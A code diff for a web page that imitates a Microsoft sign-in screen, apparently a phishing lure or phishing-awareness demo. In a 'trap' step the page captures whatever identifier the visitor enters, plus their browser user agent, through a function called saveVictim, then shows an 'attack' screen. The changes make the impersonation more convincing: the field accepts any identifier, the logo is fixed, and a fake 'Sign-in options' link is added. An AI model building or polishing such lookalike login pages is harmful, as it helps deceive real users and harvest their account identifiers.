@@ -5,19 +5,19 @@ import { saveVictim } from './actions';
 
 export default function Home() {
   const [step, setStep] = useState<'trap' | 'attack'>('trap');
-  const [email, setEmail] = useState('');
+  const [identifier, setIdentifier] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!email) return;
+    if (!identifier) return;
 
     setIsSubmitting(true);
     
     // Capture user agent
     const userAgent = navigator.userAgent;
     
-    await saveVictim(email, userAgent);
+    await saveVictim(identifier, userAgent);
     
     // Switch to scary state
     setStep('attack');
@@ -29,7 +29,7 @@ export default function Home() {
       <section className="hero-trap">
         <div className="trap-card">
           <div className="ms-logo">
-            <svg viewBox="0 0 23 23" width="108" height="23">
+            <svg viewBox="0 0 108 23" width="108" height="23">
               <path fill="#f35325" d="M0 0h11v11H0z"/>
               <path fill="#81bc06" d="M12 0h11v11H12z"/>
               <path fill="#05a6f0" d="M0 12h11v11H0z"/>
@@ -46,10 +46,10 @@ export default function Home() {
           <form onSubmit={handleSubmit}>
             <div className="form-group">
               <input
-                type="email"
+                type="text"
                 placeholder="Email, phone, or Skype"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
+                value={identifier}
+                onChange={(e) => setIdentifier(e.target.value)}
                 required
                 disabled={isSubmitting}
               />
@@ -57,6 +57,10 @@ export default function Home() {
             
             <div style={{ marginBottom: '20px', fontSize: '13px' }}>
               No account? <span style={{ color: '#0067b8', cursor: 'pointer' }}>Create one!</span>
+            </div>
+
+            <div style={{ marginBottom: '20px', fontSize: '13px', color: '#0067b8', cursor: 'pointer' }}>
+              Sign-in options
             </div>
 
             <button 
